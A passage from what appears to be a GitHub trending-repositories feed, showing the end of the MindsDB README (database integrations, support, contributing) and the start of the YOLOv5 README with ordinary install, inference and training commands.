&#xA; &lt;li&gt;REST API available as well&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Database Integrations&lt;/h2&gt; &#xA;&lt;p&gt;MindsDB works with most of the SQL and NoSQL databases and data Streams for real-time ML.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Connect your Data&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Apache Kafka-808080?style=for-the-badge&amp;amp;logo=apache-kafka&amp;amp;logoColor=white&#34; alt=&#34;Connect Apache Kafka&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Amazon%20Redshift-0466C8?style=for-the-badge&amp;amp;logo=amazon-aws&amp;amp;logoColor=white&#34; alt=&#34;Connect Amazon Redshift&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Cassandra-1287B1?style=for-the-badge&amp;amp;logo=apache%20cassandra&amp;amp;logoColor=white&#34; alt=&#34;Connect Cassandra&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Clickhouse-e6e600?style=for-the-badge&amp;amp;logo=clickhouse&amp;amp;logoColor=white&#34; alt=&#34;Connect Clickhouse&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/CockroachDB-426EDF?style=for-the-badge&amp;amp;logo=cockroach-labs&amp;amp;logoColor=white&#34; alt=&#34;Connect CockroachDB&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/MariaDB-003545?style=for-the-badge&amp;amp;logo=mariadb&amp;amp;logoColor=white&#34; alt=&#34;Connect MariaDB&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Microsoft%20SQL%20Sever-CC2927?style=for-the-badge&amp;amp;logo=microsoft%20sql%20server&amp;amp;logoColor=white&#34; alt=&#34;Connect SQL Server&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&amp;amp;logo=mongodb&amp;amp;logoColor=white&#34; alt=&#34;Connect MongoDB&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/MySQL-00758F?style=for-the-badge&amp;amp;logo=mysql&amp;amp;logoColor=white&#34; alt=&#34;Connect MySQL&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/PostgreSQL-316192?style=for-the-badge&amp;amp;logo=postgresql&amp;amp;logoColor=white&#34; alt=&#34;Connect PostgreSQL&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/QuestDB-d14671?style=for-the-badge&amp;amp;logo=questdb&amp;amp;logoColor=white&#34; alt=&#34;Connect QuestDB&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/redis-%23DD0031.svg?&amp;amp;style=for-the-badge&amp;amp;logo=redis&amp;amp;logoColor=white&#34; alt=&#34;Connect Redis&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/ScyllaDB-53CADD?style=for-the-badge&amp;amp;logo=scylladbb&amp;amp;logoColor=white&#34; alt=&#34;Connect ScyllaDB&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Singlestore-5f07b4?style=for-the-badge&amp;amp;logo=singlestore&amp;amp;logoColor=white&#34; alt=&#34;Connect Singlestore&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Snowflake-35aedd?style=for-the-badge&amp;amp;logo=snowflake&amp;amp;logoColor=blue&#34; alt=&#34;Connect Snowflake&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://docs.mindsdb.com/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Trino-dd00a1?style=for-the-badge&amp;amp;logo=trino&amp;amp;logoColor=white&#34; alt=&#34;Connect Trino&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mindsdb/mindsdb/issues/new?assignees=&amp;amp;labels=&amp;amp;template=feature-mindsdb-request.yaml&#34;&gt;&lt;span&gt;❓&lt;/span&gt; &lt;span&gt;👋&lt;/span&gt; Missing integration?&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quickstart&lt;/h2&gt; &#xA;&lt;p&gt;To get your hands on MindsDB, we recommend using the &lt;a href=&#34;https://docs.mindsdb.com/deployment/docker/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;Docker image&lt;/a&gt; or simply sign up for a &lt;a href=&#34;https://cloud.mindsdb.com/signup?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;free cloud account&lt;/a&gt;. Feel free to browse &lt;a href=&#34;https://docs.mindsdb.com?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;documentation&lt;/a&gt; for other installation methods and tutorials.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;You can find the complete documentation of MindsDB at &lt;a href=&#34;https://docs.mindsdb.com?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;docs.mindsdb.com&lt;/a&gt;. Documentation for our HTTP API can be found at &lt;a href=&#34;https://apidocs.mindsdb.com/&#34;&gt;apidocs.mindsdb.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;If you found a bug, please submit an &lt;a href=&#34;https://github.com/mindsdb/mindsdb/issues&#34;&gt;issue on Github&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To get community support, you can:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Post at MindsDB &lt;a href=&#34;https://join.slack.com/t/mindsdbcommunity/shared_invite/zt-o8mrmx3l-5ai~5H66s6wlxFfBMVI6wQ&#34;&gt;Slack community&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Ask for help at our &lt;a href=&#34;https://github.com/mindsdb/mindsdb/discussions&#34;&gt;Github Discussions&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Ask a question at &lt;a href=&#34;https://stackoverflow.com/questions/tagged/mindsdb&#34;&gt;Stackoverflow&lt;/a&gt; with a MindsDB tag.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you need commercial support, please &lt;a href=&#34;https://mindsdb.com/contact/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;contact&lt;/a&gt; the MindsDB team.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;A great place to start contributing to MindsDB will be our GitHub projects for &lt;span&gt;🏁&lt;/span&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Community writers &lt;a href=&#34;https://github.com/mindsdb/mindsdb/projects/7&#34;&gt;dashboard tasks&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Community code contributors &lt;a href=&#34;https://github.com/mindsdb/mindsdb/projects/8&#34;&gt;dashboard tasks&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Also, we are always open to suggestions so feel free to open new issues with your ideas and we can give you guidance!&lt;/p&gt; &#xA;&lt;p&gt;Being part of the core team is accessible to anyone who is motivated and wants to be part of that journey! If you&#39;d like to contribute to the project, refer to the &lt;a href=&#34;https://docs.mindsdb.com/contribute/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;contributing documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Please note that this project is released with a &lt;a href=&#34;https://github.com/mindsdb/mindsdb/raw/stable/CODE_OF_CONDUCT.md&#34;&gt;Contributor Code of Conduct&lt;/a&gt;. By participating in this project, you agree to abide by its terms.&lt;/p&gt; &#xA;&lt;h3&gt;Current contributors&lt;/h3&gt; &#xA;&lt;a href=&#34;https://github.com/mindsdb/mindsdb/graphs/contributors&#34;&gt; &lt;img src=&#34;https://contributors-img.web.app/image?repo=mindsdb/mindsdb&#34;&gt; &lt;/a&gt; &#xA;&lt;p&gt;Made with &lt;a href=&#34;https://contributors-img.web.app&#34;&gt;contributors-img&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Mailing lists&lt;/h2&gt; &#xA;&lt;p&gt;Subscribe to MindsDB Monthly &lt;a href=&#34;https://mindsdb.com/newsletter/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;Community Newsletter&lt;/a&gt; to get general announcements, release notes, information about MindsDB events, and the latest blog posts. You may also join our &lt;a href=&#34;https://mindsdb.com/beta-tester/?utm_medium=community&amp;amp;utm_source=github&amp;amp;utm_campaign=mindsdb%20repo&#34;&gt;beta-users&lt;/a&gt; group, and get access to new beta features.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;MindsDB is licensed under &lt;a href=&#34;https://github.com/mindsdb/mindsdb/raw/master/LICENSE&#34;&gt;GNU General Public License v3.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ultralytics/yolov5</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/ultralytics/yolov5</id>
    <link href="https://github.com/ultralytics/yolov5" rel="alternate"></link>
    <summary type="html">&lt;p&gt;YOLOv5 🚀 in PyTorch &gt; ONNX &gt; CoreML &gt; TFLite&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt; &lt;a align=&#34;left&#34; href=&#34;https://ultralytics.com/yolov5&#34; target=&#34;_blank&#34;&gt; &lt;img width=&#34;850&#34; src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/splash.jpg&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA; &lt;br&gt; &#xA; &lt;div&gt; &#xA;  &lt;a href=&#34;https://github.com/ultralytics/yolov5/actions/workflows/ci-testing.yml&#34;&gt;&lt;img src=&#34;https://github.com/ultralytics/yolov5/actions/workflows/ci-testing.yml/badge.svg?sanitize=true&#34; alt=&#34;CI CPU testing&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://zenodo.org/badge/latestdoi/264818686&#34;&gt;&lt;img src=&#34;https://zenodo.org/badge/264818686.svg?sanitize=true&#34; alt=&#34;YOLOv5 Citation&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://hub.docker.com/r/ultralytics/yolov5&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/ultralytics/yolov5?logo=docker&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt; &#xA;  &lt;br&gt; &#xA;  &lt;a href=&#34;https://colab.research.google.com/github/ultralytics/yolov5/blob/master/tutorial.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://www.kaggle.com/ultralytics/yolov5&#34;&gt;&lt;img src=&#34;https://kaggle.com/static/images/open-in-kaggle.svg?sanitize=true&#34; alt=&#34;Open In Kaggle&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://join.slack.com/t/ultralytics/shared_invite/zt-w29ei8bp-jczz7QYUmDtgo6r6KcMIAg&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Slack-Join_Forum-blue.svg?logo=slack&#34; alt=&#34;Join Forum&#34;&gt;&lt;/a&gt; &#xA; &lt;/div&gt; &#xA; &lt;br&gt; &#xA; &lt;p&gt; YOLOv5 🚀 is a family of object detection architectures and models pretrained on the COCO dataset, and represents &lt;a href=&#34;https://ultralytics.com&#34;&gt;Ultralytics&lt;/a&gt; open-source research into future vision AI methods, incorporating lessons learned and best practices evolved over thousands of hours of research and development. &lt;/p&gt; &#xA; &lt;div align=&#34;center&#34;&gt; &#xA;  &lt;a href=&#34;https://github.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-github.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://www.linkedin.com/company/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-linkedin.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://twitter.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-twitter.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://www.producthunt.com/@glenn_jocher&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-producthunt.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://youtube.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-youtube.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://www.facebook.com/ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-facebook.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA;  &lt;img width=&#34;2%&#34;&gt; &#xA;  &lt;a href=&#34;https://www.instagram.com/ultralytics/&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-social-instagram.png&#34; width=&#34;2%&#34;&gt; &lt;/a&gt; &#xA; &lt;/div&gt; &#xA; &lt;!--&#xA;&lt;a align=&#34;center&#34; href=&#34;https://ultralytics.com/yolov5&#34; target=&#34;_blank&#34;&gt;&#xA;&lt;img width=&#34;800&#34; src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/banner-api.png&#34;&gt;&lt;/a&gt;&#xA;--&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Documentation&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://docs.ultralytics.com&#34;&gt;YOLOv5 Docs&lt;/a&gt; for full documentation on training, testing and deployment.&lt;/p&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Quick Start Examples&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;Install&lt;/summary&gt; &#xA; &lt;p&gt;Clone repo and install &lt;a href=&#34;https://github.com/ultralytics/yolov5/raw/master/requirements.txt&#34;&gt;requirements.txt&lt;/a&gt; in a &lt;a href=&#34;https://www.python.org/&#34;&gt;&lt;strong&gt;Python&amp;gt;=3.7.0&lt;/strong&gt;&lt;/a&gt; environment, including &lt;a href=&#34;https://pytorch.org/get-started/locally/&#34;&gt;&lt;strong&gt;PyTorch&amp;gt;=1.7&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/ultralytics/yolov5  # clone&#xA;cd yolov5&#xA;pip install -r requirements.txt  # install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;Inference&lt;/summary&gt; &#xA; &lt;p&gt;YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/36&#34;&gt;PyTorch Hub&lt;/a&gt; inference. &lt;a href=&#34;https://github.com/ultralytics/yolov5/tree/master/models&#34;&gt;Models&lt;/a&gt; download automatically from the latest YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;release&lt;/a&gt;.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;&#xA;# Model&#xA;model = torch.hub.load(&#39;ultralytics/yolov5&#39;, &#39;yolov5s&#39;)  # or yolov5n - yolov5x6, custom&#xA;&#xA;# Images&#xA;img = &#39;https://ultralytics.com/images/zidane.jpg&#39;  # or file, Path, PIL, OpenCV, numpy, list&#xA;&#xA;# Inference&#xA;results = model(img)&#xA;&#xA;# Results&#xA;results.print()  # or .show(), .save(), .crop(), .pandas(), etc.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Inference with detect.py&lt;/summary&gt; &#xA; &lt;p&gt;&lt;code&gt;detect.py&lt;/code&gt; runs inference on a variety of sources, downloading &lt;a href=&#34;https://github.com/ultralytics/yolov5/tree/master/models&#34;&gt;models&lt;/a&gt; automatically from the latest YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;release&lt;/a&gt; and saving results to &lt;code&gt;runs/detect&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python detect.py --source 0  # webcam&#xA;                          img.jpg  # image&#xA;                          vid.mp4  # video&#xA;                          path/  # directory&#xA;                          path/*.jpg  # glob&#xA;                          &#39;https://youtu.be/Zgi9g1ksQHc&#39;  # YouTube&#xA;                          &#39;rtsp://example.com/media.mp4&#39;  # RTSP, RTMP, HTTP stream&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Training&lt;/summary&gt; &#xA; &lt;p&gt;The commands below reproduce YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/raw/master/data/scripts/get_coco.sh&#34;&gt;COCO&lt;/a&gt; results. &lt;a href=&#34;https://github.com/ultralytics/yolov5/tree/master/models&#34;&gt;Models&lt;/a&gt; and &lt;a href=&#34;https://github.com/ultralytics/yolov5/tree/master/data&#34;&gt;datasets&lt;/a&gt; download automatically from the latest YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;release&lt;/a&gt;. Training times for YOLOv5n/s/m/l/x are 1/2/4/6/8 days on a V100 GPU (&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/475&#34;&gt;Multi-GPU&lt;/a&gt; times faster). Use the largest &lt;code&gt;--batch-size&lt;/code&gt; possible, or pass &lt;code&gt;--batch-size -1&lt;/code&gt; for YOLOv5 &lt;a href=&#34;https://github.com/ultralytics/yolov5/pull/5092&#34;&gt;AutoBatch&lt;/a&gt;. Batch sizes shown for V100-16GB.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python train.py --data coco.yaml --cfg yolov5n.yaml --weights &#39;&#39; --batch-size 128&#xA;                                       yolov5s                                64&#xA;                                       yolov5m                                40&#xA;                                       yolov5l                                24&#xA;                                       yolov5x                                16&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;img width=&#34;800&#34; src=&#34;https://user-images.githubusercontent.com/26833433/90222759-949d8800-ddc1-11ea-9fa1-1c97eed2b963.png&#34;&gt; &#xA;&lt;/details&gt; &#xA;&lt;details open&gt; &#xA; &lt;summary&gt;Tutorials&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/wiki/Train-Custom-Data&#34;&gt;Train Custom Data&lt;/a&gt;&amp;nbsp; 🚀 RECOMMENDED&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/wiki/Tips-for-Best-Training-Results&#34;&gt;Tips for Best Training Results&lt;/a&gt;&amp;nbsp; ☘️ RECOMMENDED&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/1289&#34;&gt;Weights &amp;amp; Biases Logging&lt;/a&gt;&amp;nbsp; 🌟 NEW&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/4975&#34;&gt;Roboflow for Datasets, Labeling, and Active Learning&lt;/a&gt;&amp;nbsp; 🌟 NEW&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/475&#34;&gt;Multi-GPU Training&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/36&#34;&gt;PyTorch Hub&lt;/a&gt;&amp;nbsp; ⭐ NEW&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/251&#34;&gt;TFLite, ONNX, CoreML, TensorRT Export&lt;/a&gt; 🚀&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/303&#34;&gt;Test-Time Augmentation (TTA)&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/318&#34;&gt;Model Ensembling&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/304&#34;&gt;Model Pruning/Sparsity&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/607&#34;&gt;Hyperparameter Evolution&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/1314&#34;&gt;Transfer Learning with Frozen Layers&lt;/a&gt;&amp;nbsp; ⭐ NEW&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ultralytics/yolov5/issues/6998&#34;&gt;Architecture Summary&lt;/a&gt;&amp;nbsp; ⭐ NEW&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Environments&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Get started in seconds with our verified environments. Click each icon below for details.&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://colab.research.google.com/github/ultralytics/yolov5/blob/master/tutorial.ipynb&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-colab-small.png&#34; width=&#34;15%&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://www.kaggle.com/ultralytics/yolov5&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-kaggle-small.png&#34; width=&#34;15%&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://hub.docker.com/r/ultralytics/yolov5&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-docker-small.png&#34; width=&#34;15%&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://github.com/ultralytics/yolov5/wiki/AWS-Quickstart&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-aws-small.png&#34; width=&#34;15%&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://github.com/ultralytics/yolov5/wiki/GCP-Quickstart&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-gcp-small.png&#34; width=&#34;15%&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Integrations&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://wandb.ai/site?utm_campaign=repo_yolo_readme&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-wb-long.png&#34; width=&#34;49%&#34;&gt; &lt;/a&gt; &#xA; &lt;a href=&#34;https://roboflow.com/?ref=ultralytics&#34;&gt; &lt;img src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/logo-roboflow-long.png&#34; width=&#34;49%&#34;&gt; &lt;/a&gt; &#xA;&lt;/div&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Weights and Biases&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Roboflow ⭐ NEW&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Automatically track and visualize all your YOLOv5 training runs in the cloud with &lt;a href=&#34;https://wandb.ai/site?utm_campaign=repo_yolo_readme&#34;&gt;Weights &amp;amp; Biases&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Label and export your custom datasets directly to YOLOv5 for training with &lt;a href=&#34;https://roboflow.com/?ref=ultralytics&#34;&gt;Roboflow&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;!-- ## &lt;div align=&#34;center&#34;&gt;Compete and Win&lt;/div&gt;&#xA;&#xA;We are super excited about our first-ever Ultralytics YOLOv5 🚀 EXPORT Competition with **$10,000** in cash prizes!&#xA;&#xA;&lt;p align=&#34;center&#34;&gt;&#xA;  &lt;a href=&#34;https://github.com/ultralytics/yolov5/discussions/3213&#34;&gt;&#xA;  &lt;img width=&#34;850&#34; src=&#34;https://github.com/ultralytics/yolov5/releases/download/v1.0/banner-export-competition.png&#34;&gt;&lt;/a&gt;&#xA;&lt;/p&gt; --&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Why YOLOv5&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p align=&#34;left&#34;&gt;&lt;img width=&#34;800&#34; src=&#34;https://user-images.githubusercontent.com/26833433/155040763-93c22a27-347c-4e3c-847a-8094621d3f4e.png&#34;&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;YOLOv5-P5 640 Figure (click to expand)&lt;/summary&gt; &#xA; 